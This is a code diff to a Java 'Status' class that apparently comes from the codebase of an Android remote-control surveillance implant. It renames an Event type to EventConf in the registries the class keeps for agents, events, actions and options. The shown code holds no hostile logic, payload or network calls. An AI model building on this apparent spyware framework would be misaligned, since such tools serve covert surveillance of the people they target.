@@ -15,7 +15,7 @@ import android.content.Context;
 import com.ht.RCSAndroidGUI.action.Action;
 import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.conf.Option;
-import com.ht.RCSAndroidGUI.event.Event;
+import com.ht.RCSAndroidGUI.event.EventConf;
 import com.ht.RCSAndroidGUI.utils.Check;
 
 // TODO: Auto-generated Javadoc
@@ -29,7 +29,7 @@ public class Status {
 	private final HashMap<Integer, AgentConf> agentsMap;
 
 	/** The events map. */
-	private final HashMap<Integer, Event> eventsMap;
+	private final HashMap<Integer, EventConf> eventsMap;
 
 	/** The actions map. */
 	private final HashMap<Integer, Action> actionsMap;
@@ -54,7 +54,7 @@ public class Status {
 	 */
 	private Status() {
 		agentsMap = new HashMap<Integer, AgentConf>();
-		eventsMap = new HashMap<Integer, Event>();
+		eventsMap = new HashMap<Integer, EventConf>();
 		actionsMap = new HashMap<Integer, Action>();
 		optionsMap = new HashMap<Integer, Option>();
 	}
@@ -131,7 +131,7 @@ public class Status {
 	 * @throws RCSException
 	 *             the rCS exception
 	 */
-	public void addEvent(final Event e) throws RCSException {
+	public void addEvent(final EventConf e) throws RCSException {
 		// Don't add the same event twice
 		if (eventsMap.containsKey(e.getId()) == true) {
 			throw new RCSException("Event " + e.getId() + " already loaded");
@@ -226,7 +226,7 @@ public class Status {
 	 * 
 	 * @return the events map
 	 */
-	public HashMap<Integer, Event> getEventsMap() {
+	public HashMap<Integer, EventConf> getEventsMap() {
 		return eventsMap;
 	}
 
@@ -294,12 +294,12 @@ public class Status {
 	 * @throws RCSException
 	 *             the rCS exception
 	 */
-	public Event getEvent(final int id) throws RCSException {
+	public EventConf getEvent(final int id) throws RCSException {
 		if (eventsMap.containsKey(id) == false) {
 			throw new RCSException("Event " + id + " not found");
 		}
 
-		final Event e = eventsMap.get(id);
+		final EventConf e = eventsMap.get(id);
 
 		if (e == null) {
 			throw new RCSException("Event " + id + " is null");
